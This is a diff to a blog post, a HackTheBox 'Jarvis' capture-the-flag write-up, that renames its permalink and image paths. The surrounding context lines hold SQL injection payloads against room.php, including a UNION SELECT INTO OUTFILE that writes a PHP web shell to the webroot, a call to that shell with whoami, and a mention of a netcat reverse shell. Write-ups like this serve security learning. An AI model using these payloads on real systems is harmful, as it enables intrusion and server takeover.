@@ -2,8 +2,8 @@
 title: Jarvis &#8211; HackTheBox WriteUp
 author: yakuhito
 layout: post
-permalink: jarvis_htb_writeup
-image: /images/jarvis_htb_writeup/jarvis_htb_writeup.png
+permalink: jarvis-htb-writeup
+image: /images/jarvis-htb-writeup/jarvis-htb-writeup.png
 category: htb
 ---
 Note: This is my first HTB writeup, so opinions are more than welcome.
@@ -39,7 +39,7 @@ root@fury-battlestation:~/htb/blog/jarvis#
 OpenSSH seemed to be up-to-date, so I decided to check port 80 for vulnerabilities.
 
 <div>
-<center><img src="/images/jarvis_htb_writeup/image-5-1024x650.png"></center>
+<center><img src="/images/jarvis-htb-writeup/image-5-1024x650.png"></center>
 </div>
 
 The site looked like it was custom-made, so I decided to explore it more. After playing around for a bit, I discovered an interesting URL:
@@ -50,7 +50,7 @@ http://jarvis.htb/room.php?cod=1
 {% endhighlight %}
 
 <div>
-<center><img src="/images/jarvis_htb_writeup/image-6-1024x509.png"></center>
+<center><img src="/images/jarvis-htb-writeup/image-6-1024x509.png"></center>
 </div>
 
 Do you see the LFI? I did, too, but it turns out that was an SQL injection 🙂 A simple, working payload could be
@@ -68,7 +68,7 @@ http://jarvis.htb/room.php?cod=7%20UNION%20SELECT%201,2,3,4,5,6,7;%20--
 {% endhighlight %}
 
 <div>
-<center><img src="/images/jarvis_htb_writeup/image-7-1024x593.png"></center>
+<center><img src="/images/jarvis-htb-writeup/image-7-1024x593.png"></center>
 </div>
 
 Now that we have a working SQL `SELECT` statement, we can insert anything in the results. I wanted to write a simple PHP shell in a file on the server and then use it to get a reverse shell. I tried writing using the `INTO OUTFILE` statement, and it worked. Also, since the target is most probably running Linux, I tried to write the file in the default webroot directory (`/var/www/html`):
@@ -79,7 +79,7 @@ http://jarvis.htb/room.php?cod=7%20UNION%20SELECT%201,%27%3C?php%20echo%20shell_
 {% endhighlight %}
 
 <div>
-<center><img src="/images/jarvis_htb_writeup/image-8-1024x615.png"></center>
+<center><img src="/images/jarvis-htb-writeup/image-8-1024x615.png"></center>
 </div>
 
 There was no output, which is normal because the SQL engine saves the query output to a file instead of passing it on to PHP. We can test that the query worked by trying to run a simple command on the server (`whoami`):
@@ -90,7 +90,7 @@ http://jarvis.htb/yakuhito_shell.php?cmd=whoami
 {% endhighlight %}
 
 <div>
-<center><img src="/images/jarvis_htb_writeup/image-9.png"></center>
+<center><img src="/images/jarvis-htb-writeup/image-9.png"></center>
 </div>
 
 One thing that I learned from the OSCP course is to only value reverse shells, so I spawned one using netcat:
